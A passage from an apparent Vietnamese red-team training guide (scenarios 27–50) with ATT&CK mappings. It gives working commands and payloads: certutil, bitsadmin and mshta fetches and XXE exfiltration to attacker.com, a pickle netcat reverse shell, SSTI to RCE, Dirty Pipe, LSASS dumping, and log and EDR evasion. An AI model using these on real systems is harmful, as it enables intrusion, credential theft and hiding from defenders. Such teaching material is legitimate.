- **Tình huống tác chiến:** Bạn chiếm được quyền SYSTEM trên một máy chủ Windows Remote Desktop Server (Terminal Server). Một tài khoản Quản trị viên cấp cao đang có phiên đăng nhập RDP bị ngắt kết nối (Disconnected). Làm thế nào để chiếm phiên đó mà không cần biết mật khẩu của họ?
- **Phương thức tấn công & Lệnh thực thi:**
  1. Liệt kê các phiên RDP đang hoạt động bằng lệnh `query user` hoặc `qwinsta`:
     ```cmd
     query user
     ```
     Giả sử phiên của Domain Admin `admin_sec` có `SESSIONNAME = rdp-tcp#2` với `ID = 3` đang ở trạng thái `Disc`.
  2. Với đặc quyền SYSTEM, sử dụng tiện ích tích hợp `tscon.exe` để gắn phiên đó vào màn hình console hiện tại của bạn:
     ```cmd
     tscon.exe 3 /dest:console
     ```
  3. Màn hình máy tính lập tức chuyển sang phiên làm việc của Domain Admin mà không yêu cầu nhập lại mật khẩu.
- **MITRE ATT&CK:** [T1563.002 - Remote Service Session Hijacking: RDP Hijacking](https://attack.mitre.org/techniques/T1563/002/)

#### Kịch bản 28: Kỹ thuật PortProxy của Windows để Pivoting nội bộ không cần cài thêm tool
- **Tình huống tác chiến:** Bạn chiếm được quyền Administrator trên một máy trạm Windows nhưng môi trường có cơ chế AppLocker cực kỳ nghiêm ngặt, cấm chạy các công cụ ngoài như Chisel hay Plink. Làm thế nào để biến máy trạm này thành trạm trung chuyển lưu lượng?
- **Phương thức tấn công & Lệnh thực thi:**
  1. Sử dụng tiện ích dòng lệnh chuẩn `netsh` tích hợp sẵn trong mọi phiên bản Windows:
     ```cmd
     netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.30.50
     ```
  2. Lệnh trên cấu hình Windows tự động chuyển tiếp mọi gói tin TCP gửi tới cổng 8888 của máy trạm sang cổng 80 của máy chủ cơ sở dữ liệu `10.10.30.50` ở phân vùng mạng kín phía sau.
  3. Mở cổng trên Windows Firewall nếu cần:
     ```cmd
     netsh advfirewall firewall add rule name="ForwardPort8888" dir=in action=allow protocol=TCP localport=8888
     ```
- **MITRE ATT&CK:** [T1090.001 - Proxy: Internal Proxy](https://attack.mitre.org/techniques/T1090/001/)

#### Kịch bản 29: Leo thang đặc quyền cục bộ Linux qua lỗ hổng Kernel (Dirty Pipe - CVE-2022-0847)
- **Tình huống tác chiến:** Trên một máy chủ Linux vừa chiếm được quyền `www-data`, kernel hiển thị phiên bản `5.13.0`. Trình bày cơ chế lỗ hổng Dirty Pipe cho phép ghi đè tệp chỉ đọc `/etc/passwd`.
- **Phương thức tấn công & Lệnh thực thi:**
  1. Dirty Pipe xuất phát từ lỗi khởi tạo cờ `PIPE_BUF_FLAG_CAN_MERGE` trong bộ đệm đường ống (pipe buffer) của nhân Linux 5.8 đến 5.16.11.
  2. Lỗi này cho phép một tiến trình người dùng không có đặc quyền ghi đè dữ liệu trực tiếp vào bộ đệm trang (Page Cache) của bất kỳ tệp tin nào trong hệ thống, bất chấp quyền hạn của tệp tin đó trên đĩa.
  3. Khai thác: Chạy mã exploit Dirty Pipe ghi đè dòng tài khoản `root` trong `/etc/passwd`, thay thế mã băm mật khẩu thành một hash đã biết hoặc gỡ bỏ mật khẩu của root:
     ```bash
     ./dirtypipe /etc/passwd 1 "root::0:0:root:/root:/bin/bash"
     su root
     ```
- **MITRE ATT&CK:** [T1068 - Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)

#### Kịch bản 30: Vượt qua cơ chế kiểm soát ứng dụng AppLocker bằng LOLBAS
- **Tình huống tác chiến:** Máy trạm Windows bật AppLocker ở chế độ Enforce Rules, cấm thực thi file `.exe` ngoài các thư mục được phê duyệt (`C:\Windows` và `C:\Program Files`). Làm thế nào để thực thi payload C2?
- **Phương thức tấn công & Lệnh thực thi:**
  1. Khai thác các tệp nhị phân tin cậy của Microsoft (Living Off The Land Binaries - LOLBAS) có khả năng thực thi mã thay thế:
     - Dùng `InstallUtil.exe` hoặc `Regasm.exe` (nằm trong thư mục `.NET Framework` thuộc diện được cấp phép):
       ```cmd
       C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /u payload.exe
       ```
     - Dùng `mshta.exe` thực thi script từ xa:
       ```cmd
       mshta.exe http://attacker.com/payload.hta
       ```
     - Dùng `rundll32.exe` nạp DLL độc hại đặt tại thư mục có quyền ghi nhưng thuộc đường dẫn được miễn trừ như `C:\Windows\Tasks` hoặc `C:\Windows\Tracing`.
- **MITRE ATT&CK:** [T1218 - System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/)

---

### CHỦ ĐỀ 4: ADVANCED WEB & API EXPLOITATION (KỊCH BẢN 31 - 40)

#### Kịch bản 31: Khai thác SSRF chiếm quyền AWS IAM qua IMDSv1 và phân tích IMDSv2
- **Tình huống tác chiến:** Bạn tìm thấy lỗ hổng SSRF trên tính năng tạo ảnh PDF từ URL của ứng dụng web chạy trên máy ảo AWS EC2. Hãy trình bày cách trích xuất AWS Access Key và cách vượt qua nếu hệ thống nâng cấp lên IMDSv2.
- **Phương thức tấn công & Khai thác:**
  1. *Khai thác trên IMDSv1:* Gửi yêu cầu GET trực tiếp tới link-local IP:
     ```http
     GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
     ```
     Sau khi lấy được tên IAM Role (ví dụ `WebAppRole`), tiếp tục gửi:
     ```http
     GET http://169.254.169.254/latest/meta-data/iam/security-credentials/WebAppRole
     ```
     Server trả về: `AccessKeyId`, `SecretAccessKey`, và `Token`.
  2. *Thách thức với IMDSv2:* IMDSv2 bắt buộc phải có tiêu đề session token (`X-aws-ec2-metadata-token`) được tạo từ phương thức `PUT`. Nếu lỗ hổng SSRF chỉ hỗ trợ GET hoặc không cho phép custom header, attacker không thể đọc được metadata.
- **MITRE ATT&CK:** [T1552.005 - Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005/)

#### Kịch bản 32: Tấn công JWT (JSON Web Token) - Thuật toán "None" và Algorithm Confusion
- **Tình huống tác chiến:** Ứng dụng web sử dụng JWT để duy trì trạng thái đăng nhập. Phân tích 2 kỹ thuật tấn công phổ biến để mạo danh tài khoản admin.
- **Phương thức tấn công:**
  1. *Thuật toán "none":* Một số thư viện kiểm tra lỏng lẻo chấp nhận giá trị `"alg": "none"` trong header. Kẻ tấn công sửa payload thành `{"user": "admin", "role": "administrator"}`, xóa toàn bộ phần chữ ký số (phần thứ 3 sau dấu chấm cuối cùng) và gửi lên server.
  2. *Algorithm Confusion (RS256 sang HS256):* Server sử dụng khóa công khai RSA để xác thực token ký bằng thuật toán bất đối xứng RS256. Kẻ tấn công sửa header thành `"alg": "HS256"` (mật mã đối xứng) và ký token giả mạo bằng chính khóa công khai của server (vốn công khai qua endpoint `.well-known/jwks.json`). Khi server thẩm định bằng hàm băm HMAC sử dụng cùng khóa công khai này, chữ ký được coi là hợp lệ!
- **MITRE ATT&CK:** [T1556 - Modify Authentication Process](https://attack.mitre.org/techniques/T1556/)

#### Kịch bản 33: Khai thác lỗi GraphQL Batching & Introspection Query
- **Tình huống tác chiến:** Khi kiểm thử một API endpoint GraphQL (`/graphql`), tính năng kiểm tra tự động bị tắt. Làm thế nào để tái hiện cấu trúc schema và vượt qua cơ chế giới hạn tần suất (Rate Limiting)?
- **Phương thức tấn công:**
  1. *Schema Dump qua Introspection:* Gửi truy vấn `__schema` để lấy toàn bộ các kiểu dữ liệu, queries và mutations:
     ```graphql
     query { __schema { types { name fields { name } } } }
     ```
  2. *Bypass Rate Limiting qua Query Batching:* Nhiều hệ thống WAF/Rate Limiter chỉ đếm số lượng HTTP request gửi đến. GraphQL cho phép gộp hàng trăm truy vấn xác thực vào trong duy nhất một HTTP POST request:
     ```json
     [
       {"query": "mutation { login(user: \"admin\", pass: \"123456\") { token } }"},
       {"query": "mutation { login(user: \"admin\", pass: \"password\") { token } }"},
       {"query": "mutation { login(user: \"admin\", pass: \"admin123\") { token } }"}
     ]
     ```
     Hacker có thể thử hàng ngàn mật khẩu chỉ với một vài kết nối HTTP.
- **MITRE ATT&CK:** [T1110.001 - Brute Force: Password Guessing](https://attack.mitre.org/techniques/T1110/001/)

#### Kịch bản 34: Tấn công Race Condition trong giao dịch tài chính / voucher khuyến mãi
- **Tình huống tác chiến:** Mô tả kỹ thuật khai thác Race Condition (Time-of-Check to Time-of-Use - TOCTOU) cho phép một mã giảm giá hoặc số dư ví điện tử bị sử dụng nhiều lần đồng thời.
- **Phương thức tấn công:**
  1. Ứng dụng thực hiện kiểm tra số dư trước, sau đó mới trừ tiền:
     - Luồng 1: Kiểm tra số dư ($100 >= $100 -> Cho phép rút)
     - Luồng 2: Kiểm tra số dư ($100 >= $100 -> Cho phép rút)
     - Luồng 1: Trừ tiền ($100 - $100 = $0)
     - Luồng 2: Trừ tiền ($0 - $100 = -$100)
  2. Sử dụng Burp Suite Turbo Intruder hoặc extension HTTP/2 Single-Packet Attack để gửi đồng loạt 30 yêu cầu rút tiền trong cùng một khung dữ liệu TCP (gói tin đến server cùng một nano giây).
- **MITRE ATT&CK:** [T1499 - Endpoint Denial of Service / Logic Flaw](https://attack.mitre.org/techniques/T1499/)

#### Kịch bản 35: Khai thác Insecure Deserialization trong Java / Python
- **Tình huống tác chiến:** Ứng dụng truyền dữ liệu đối tượng được tuần tự hóa (Serialized Object). Làm thế nào để đạt được Remote Code Execution (RCE)?
- **Phương thức tấn công:**
  1. *Trong Java:* Dữ liệu bắt đầu bằng byte ma thuật `rO0` (Base64) hoặc `AC ED 00 05` (Hex). Sử dụng công cụ `ysoserial` để tạo chuỗi gadget chain (ví dụ `CommonsCollections5` hoặc `Spring1`) kích hoạt gọi hàm `Runtime.getRuntime().exec()`.
  2. *Trong Python:* Sử dụng module `pickle`. Phương thức `__reduce__` cho phép định nghĩa hàm sẽ được gọi khi đối tượng được unpickle:
     ```python
     import pickle, os
     class Exploit(object):
         def __reduce__(self):
             return (os.system, ('nc -e /bin/sh 10.10.10.5 4444',))
     payload = pickle.dumps(Exploit())
     ```
- **MITRE ATT&CK:** [T1203 - Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203/)

#### Kịch bản 36: Tấn công XML External Entity (XXE) đọc tệp hệ thống và SSRF
- **Tình huống tác chiến:** Ứng dụng phân tích cú pháp dữ liệu XML tải lên. Trình bày payload XXE để đọc tệp `/etc/passwd` và payload kiểm tra mù (Blind Out-of-Band XXE).
- **Phương thức tấn công & Lệnh thực thi:**
  1. *Đọc tệp trực tiếp:*
     ```xml
     <?xml version="1.0" encoding="ISO-8859-1"?>
     <!DOCTYPE foo [ <!ELEMENT foo ANY >
     <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
     <user><name>&xxe;</name></user>
     ```
  2. *Blind XXE qua OOB (Out-of-Band):* Định nghĩa thực thể DTD bên ngoài gửi dữ liệu trích xuất về máy chủ web của attacker:
     ```xml
     <!DOCTYPE foo [
     <!ENTITY % file SYSTEM "file:///etc/hostname">
     <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
     %dtd;
     %send;
     ]>
     ```
- **MITRE ATT&CK:** [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)

#### Kịch bản 37: Khai thác Server-Side Template Injection (SSTI) trên Jinja2 / Python
- **Tình huống tác chiến:** Người dùng nhập tên và ứng dụng hiển thị `Hello {{user}}`. Nếu nhập `{{7*7}}`, trang web in ra `Hello 49`. Hãy viết payload leo thang lên RCE thực thi lệnh hệ thống.
- **Phương thức tấn công:**
  1. Xác nhận Template Engine là Jinja2 (Python).
  2. Khai thác cây phân cấp đối tượng trong Python (MRO - Method Resolution Order) để tìm lớp `subprocess.Popen`:
     ```jinja2
     {{ ''.__class__.__mro__[1].__subclasses__() }}
     ```
  3. Lọc tìm chỉ số của `subprocess.Popen` và gọi thực thi lệnh:
     ```jinja2
     {{ ''.__class__.__mro__[1].__subclasses__()[40]('/usr/bin/id',shell=True,stdout=-1).communicate()[0].strip() }}
     ```
- **MITRE ATT&CK:** [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)

#### Kịch bản 38: HTTP Request Smuggling (CL.TE và TE.CL)
- **Tình huống tác chiến:** Giải thích nguyên lý tấn công HTTP Request Smuggling khi có sự bất đồng giữa Front-End Proxy và Back-End Server trong việc giải thích tiêu đề `Content-Length` (CL) và `Transfer-Encoding` (TE).
- **Phương thức phân tích:**
  1. *Kịch bản CL.TE:* Front-end xử lý tiêu đề `Content-Length`, Back-end xử lý tiêu đề `Transfer-Encoding: chunked`.
  2. Kẻ tấn công gửi một request chứa cả 2 header. Front-end đọc độ dài theo CL và chuyển tiếp toàn bộ gói tin. Tuy nhiên Back-end đọc theo TE và dừng lại ở đoạn kết thúc chunk `0\r\n\r\n`.
  3. Phần dữ liệu còn thừa (smuggled data) sẽ nằm lại trong hàng đợi của socket kết nối và tự động gắn vào đầu HTTP request của người dùng tiếp theo, cho phép hacker đánh cắp cookie hoặc mạo danh phiên của nạn nhân khác.
- **MITRE ATT&CK:** [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)

#### Kịch bản 39: Tấn công OAuth 2.0 Redirect URI Manipulation
- **Tình huống tác chiến:** Trong luồng đăng nhập "Sign in with Google/Facebook", làm thế nào hacker có thể đánh cắp Authorization Code của người dùng?
- **Phương thức tấn công:**
  1. Khai thác lỗi xác thực lỏng lẻo tham số `redirect_uri` của OAuth Authorization Server (ví dụ regex chấp nhận subdomain hoặc path traversal).
  2. Hacker gửi liên kết đăng nhập cho nạn nhân với `redirect_uri=https://auth.company.com.attacker.com` hoặc `https://company.com/oauth/callback/../../attacker_page`.
  3. Khi nạn nhân đồng ý đăng nhập, nhà cung cấp OAuth chuyển hướng kèm theo mã `code` xác thực về trang web của hacker. Hacker dùng mã này đổi lấy Access Token và chiếm quyền tài khoản.
- **MITRE ATT&CK:** [T1556 - Modify Authentication Process](https://attack.mitre.org/techniques/T1556/)

#### Kịch bản 40: Khai thác Mass Assignment trên API hiện đại
- **Tình huống tác chiến:** Một ứng dụng Node.js nhận request cập nhật địa chỉ người dùng qua `POST /api/v1/profile` và lưu trực tiếp `User.update(req.body)`. Hãy trình bày cách nâng quyền admin.
- **Phương thức tấn công:**
  1. Mô hình đối tượng `User` trong cơ sở dữ liệu có các trường ẩn như `is_admin`, `verified`, hoặc `role`.
  2. Gửi payload JSON chứa thêm các trường này:
     ```json
     {
       "address": "123 Main St",
       "role": "admin",
       "is_admin": true,
       "permissions": ["all"]
     }
     ```
  3. Nếu backend không sử dụng DTO (Data Transfer Object) với Allowlist rõ ràng, framework sẽ gán toàn bộ các thuộc tính này vào bản ghi DB.
- **MITRE ATT&CK:** [T1078 - Valid Accounts](https://attack.mitre.org/techniques/T1078/)

---

### CHỦ ĐỀ 5: OPSEC, C2 INFRASTRUCTURE & INCIDENT RESPONSE INTERACTION (KỊCH BẢN 41 - 50)

#### Kịch bản 41: Thiết kế hạ tầng C2 phân tán có Redirector và Domain Fronting
- **Tình huống tác chiến:** Làm thế nào để thiết kế một hệ thống máy chủ C2 (Cobalt Strike / Sliver) sao cho nếu một điểm kết nối bị Blue Team hoặc VirusTotal phát hiện thì máy chủ C2 Team Server thực sự vẫn hoàn toàn an toàn và ẩn danh?
- **Phương thức triển khai:**
  1. *Kiến trúc Phân cấp:* Máy chủ C2 Team Server đặt ở vùng mạng kín riêng biệt, không mở IP công khai cho agent kết nối trực tiếp.
  2. *Thiết lập Redirector:* Đặt các máy chủ proxy nhẹ (Nginx hoặc Apache) tại các nhà cung cấp đám mây khác nhau làm lá chắn phía trước (Edge Redirectors).
  3. Cấu hình Nginx kiểm tra User-Agent, URI path hợp lệ và chuyển tiếp (Reverse Proxy) về C2 backend; nếu request từ máy quét bảo mật (Shodan, sandbox), redirect sang trang tin tức hoặc trả về lỗi 404.
  4. *Domain Fronting / CDN:* Đặt lưu lượng đi qua mạng phân phối nội dung (Cloudflare, CloudFront, Azure CDN) để che giấu hoàn toàn địa chỉ IP thật của Redirector.
- **MITRE ATT&CK:** [T1090.004 - Proxy: Domain Fronting](https://attack.mitre.org/techniques/T1090/004/)

#### Kịch bản 42: Tùy biến Malleable C2 Profile để qua mặt Network Traffic Analysis
- **Tình huống tác chiến:** Đội ngũ Blue Team triển khai Zeek và Suricata giám sát lưu lượng mạng. Làm thế nào để ngụy trang lưu lượng Beaconing của C2 giống hệt như lưu lượng duyệt web hợp lệ tới Microsoft Teams hoặc Amazon?
- **Phương thức thực hiện:**
  1. Viết profile Malleable C2 tùy biến (ví dụ trong Cobalt Strike hoặc Sliver):
     - Biến đổi HTTP GET/POST: Đặt URI giả lập API của Microsoft (ví dụ `/api/v1/teams/notifications/polling`).
     - Mã hóa dữ liệu Beacon bằng Base64Url và giấu vào Cookie `MS-CV` hoặc tiêu đề HTTP `ETag`.
     - Chèn các header phản hồi chuẩn của Microsoft IIS và máy chủ Azure.
  2. Thiết lập độ trễ linh hoạt (Jitter): Đặt Sleep Time = 60s với Jitter = 30% để khoảng cách thời gian giữa các gói tin dao động ngẫu nhiên từ 42s đến 78s, triệt tiêu khả năng phát hiện theo chu kỳ tần số (Frequency Analysis / Beaconing Detection) của SIEM.
- **MITRE ATT&CK:** [T1071.001 - Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001/)

#### Kịch bản 43: Kỹ thuật Timestomping xóa dấu vết thời gian trên tệp tin
- **Tình huống tác chiến:** Khi bạn sao chép một công cụ độc hại lên đĩa cứng của máy nạn nhân, trường thời gian khởi tạo (Creation Time) sẽ hiển thị ngày giờ hiện tại, khiến chuyên gia điều tra số (Forensics) phát hiện ngay khi lọc tệp mới tạo. Làm thế nào để che giấu?
- **Phương thức tấn công & Lệnh thực thi:**
  1. *Timestomping:* Sao chép các thuộc tính thời gian MACB (Modified, Accessed, Created, Born) từ một tệp tin hệ thống hợp lệ và lâu đời (như `notepad.exe` hoặc `kernel32.dll`) sang tệp của attacker.
  2. Thực hiện bằng Meterpreter:
     ```text
     timestomp evil.exe -f C:\Windows\System32\cmd.exe
     ```
  3. Hoặc bằng PowerShell:
     ```powershell
     (Get-Item evil.exe).CreationTime = (Get-Item C:\Windows\System32\cmd.exe).CreationTime
     ```
- **MITRE ATT&CK:** [T1070.006 - Indicator Removal: Timestomp](https://attack.mitre.org/techniques/T1070/006/)

#### Kịch bản 44: Kỹ thuật Parent PID (PPID) Spoofing
- **Tình huống tác chiến:** Khi một tiến trình độc hại chạy lệnh `powershell.exe`, nếu cha của nó là `word.exe` (từ file macro phising), hệ thống EDR sẽ lập tức kích hoạt cảnh báo bất thường vì Word không bao giờ gọi PowerShell trong hoạt động thông thường. Làm thế nào để thay đổi mối quan hệ cha-con này?
- **Phương thức tấn công:**
  1. Sử dụng cấu trúc mở rộng `STARTUPINFOEX` và hàm API `UpdateProcThreadAttribute`.
  2. Chỉ định thuộc tính `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` và truyền vào handle của một tiến trình hệ thống hợp lệ đang chạy (ví dụ `explorer.exe` hoặc `spoolsv.exe`).
  3. Khi tiến trình con được tạo, cây tiến trình của EDR và Process Explorer sẽ hiển thị `powershell.exe` được sinh ra từ `explorer.exe`, xóa bỏ hoàn toàn dấu vết từ macro Word.
- **MITRE ATT&CK:** [T1134.004 - Access Token Manipulation: Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004/)

#### Kịch bản 45: Token Impersonation và SeAssignPrimaryTokenPrivilege
- **Tình huống tác chiến:** Bạn chiếm được shell dưới quyền tài khoản dịch vụ `LOCAL SERVICE` hoặc `NETWORK SERVICE` có đặc quyền `SeImpersonatePrivilege` hoặc `SeAssignPrimaryTokenPrivilege`. Trình bày kỹ thuật Potato Exploit để nâng quyền lên SYSTEM.
- **Phương thức tấn công:**
  1. Khai thác họ lỗ hổng Potato (JuicyPotato, SweetPotato, RoguePotato, PrintSpoofer).
  2. Ép một dịch vụ chạy dưới quyền SYSTEM (như BITS hoặc DCOM/Spooler) thực hiện xác thực NTLM nội bộ tới một cổng mạng cục bộ do attacker kiểm soát thông qua cuộc gọi RPC/ALPC.
  3. Thu giữ Access Token của SYSTEM được gửi đến và mạo danh (impersonate) token này thông qua các hàm API `SetThreadToken` hoặc `CreateProcessWithTokenW` để sinh ra một shell mới với quyền `NT AUTHORITY\SYSTEM`.
- **MITRE ATT&CK:** [T1134.001 - Access Token Manipulation: Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001/)

#### Kịch bản 46: Trích xuất mật khẩu từ LSASS bằng Silent Process Exit / ProcDump
- **Tình huống tác chiến:** EDR chặn mọi hành vi mở handle trực tiếp vào tiến trình `lsass.exe` với quyền `PROCESS_VM_READ`. Làm thế nào để lấy dump bộ nhớ LSASS một cách gián tiếp?
- **Phương thức tấn công:**
  1. *Kỹ thuật Silent Process Exit (Windows Error Reporting):* Cấu hình registry cho phép Windows tự động tạo tệp crash dump khi tiến trình kết thúc thông qua `WerFault.exe` (tiến trình tin cậy của Microsoft):
     ```cmd
     reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v DumpType /t REG_DWORD /d 2
     ```
  2. *Sử dụng ProcDump chính chủ từ Sysinternals:*
     ```cmd
     procdump.exe -ma -accepteula lsass.exe lsass.dmp
     ```
  3. Tải tệp `.dmp` về máy offline và trích xuất mã băm bằng Mimikatz:
     ```text
     sekurlsa::minidump lsass.dmp
     sekurlsa::logonpasswords
     ```
- **MITRE ATT&CK:** [T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)

#### Kịch bản 47: Khai thác Living Off The Land Binaries (LOLBAS) - Certutil & Bitsadmin
- **Tình huống tác chiến:** Làm thế nào để tải payload độc hại từ máy chủ từ xa về máy mục tiêu mà không bị EDR phát hiện hành vi tải file bất thường của PowerShell hoặc `curl`?
- **Phương thức tấn công & Lệnh thực thi:**
  1. Sử dụng tiện ích quản lý chứng chỉ số `certutil.exe`:
     ```cmd
     certutil.exe -urlcache -split -f http://attacker.com/payload.txt C:\Windows\Temp\payload.exe
     ```
  2. Sử dụng dịch vụ truyền tệp ngầm `bitsadmin.exe`:
     ```cmd
     bitsadmin /transfer myJob /download /priority normal http://attacker.com/payload.txt C:\Windows\Temp\payload.exe
     ```
  3. Giải mã file bị obfuscate bằng Certutil Base64 decode:
     ```cmd
     certutil.exe -decode encoded.txt evil.dll
     ```
- **MITRE ATT&CK:** [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)

#### Kịch bản 48: Thoát khỏi môi trường Windows Defender Application Control (WDAC) / Constrained Language Mode (CLM)
- **Tình huống tác chiến:** PowerShell bị khóa ở chế độ Constrained Language Mode (`$ExecutionContext.SessionState.LanguageMode` = `ConstrainedLanguage`), cấm gọi các hàm API Windows và .NET reflection. Làm thế nào để chạy C# payload?
- **Phương thức tấn công:**
  1. CLM chỉ ràng buộc các session chạy bởi powershell.exe thông thường.
  2. Tạo một ứng dụng C# console tùy biến hoặc sử dụng công cụ nạp mã độc không bị CLM giới hạn như `InstallUtil`, `MSBuild` hoặc `PowerShdll`.
  3. Sử dụng `MSBuild.exe` thực thi một tệp cấu hình `.csproj` hoặc `.xml` chứa mã C# trực tiếp bên trong thẻ `<Task>`:
     ```cmd
     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe run_payload.xml
     ```
- **MITRE ATT&CK:** [T1127.001 - Trusted Developer Utilities Proxy Execution: MSBuild](https://attack.mitre.org/techniques/T1127/001/)

#### Kịch bản 49: Thu thập và xóa dấu vết Event Logs một cách chọn lọc
- **Tình huống tác chiến:** Thay vì xóa toàn bộ Event Log (`wevtutil cl Security`) - một hành vi cực kỳ đáng ngờ sinh Event ID 1102 và lập tức kích hoạt chuông báo động của SOC, làm thế nào để vô hiệu hóa việc ghi log một cách kín đáo?
- **Phương thức tấn công:**
  1. Không xóa toàn bộ log. Sử dụng kỹ thuật Thread Suspend trên dịch vụ Event Log:
     - Dịch vụ Windows Event Log (`EventLog`) chạy bên trong một tiến trình `svchost.exe`.
     - Tìm kiếm các luồng (threads) bên trong `svchost.exe` chịu trách nhiệm ghi nhận sự kiện bảo mật (dùng công cụ Phant0m hoặc Invoke-Phant0m).
     - Gọi hàm API `SuspendThread` để đóng băng các luồng này.
  2. Dịch vụ Event Log vẫn hiển thị trạng thái `Running` trên Task Manager, nhưng không có bất kỳ bản ghi sự kiện bảo mật mới nào được ghi nhận thêm vào hệ thống.
- **MITRE ATT&CK:** [T1562.002 - Impair Defenses: Disable Windows Event Logging](https://attack.mitre.org/techniques/T1562/002/)

#### Kịch bản 50: Quy trình dọn dẹp hậu tác chiến (Post-Engagement Cleanup) và Bàn giao
- **Tình huống tác chiến:** Một chiến dịch Red Team kéo dài 3 tuần vừa kết thúc. Hãy nêu các bước bắt buộc phải thực hiện trong quy trình Cleanup để bảo đảm không để lại bất kỳ rủi ro bảo mật nào cho hệ thống khách hàng.
- **Phương thức thực hiện & Quy chuẩn:**
  1. *Gỡ bỏ Cửa sau & Persistence:* Xóa toàn bộ Scheduled Tasks, Registry Run Keys, WMI Event Subscriptions, dịch vụ Windows và tài khoản phụ đã tạo trong quá trình tác chiến.
  2. *Xóa tệp tin độc hại:* Xóa sạch mọi tệp nhị phân, webshell, script, dump file và công cụ trung gian đặt tại các thư mục tạm (`Temp`, `Tasks`, `Public`).
  3. *Hủy kết nối C2:* Phát lệnh Kill Agent trên tất cả các máy trạm và hủy hạ tầng máy chủ C2 / Redirectors.
  4. *Khôi phục cấu hình:* Trả lại trạng thái cấu hình ban đầu cho các dịch vụ đã chỉnh sửa (như GPO, ACL hoặc Service BinPath).
  5. *Báo cáo bàn giao:* Cung cấp tệp nhật ký tác chiến chi tiết (Execution Timeline) bao gồm: thời gian chính xác, IP nguồn, máy đích, tài khoản sử dụng, lệnh thực thi và trạng thái dọn dẹp để đội ngũ Blue Team đối chiếu với nhật ký SIEM nhằm cải thiện năng lực phát hiện.
- **MITRE ATT&CK:** [NIST SP 800-115 Post-Testing Activities](file:///mnt/second_drive/DOCS/SEC/docs/References/06_NIST_SP_800-115_Technical_Guide.md)
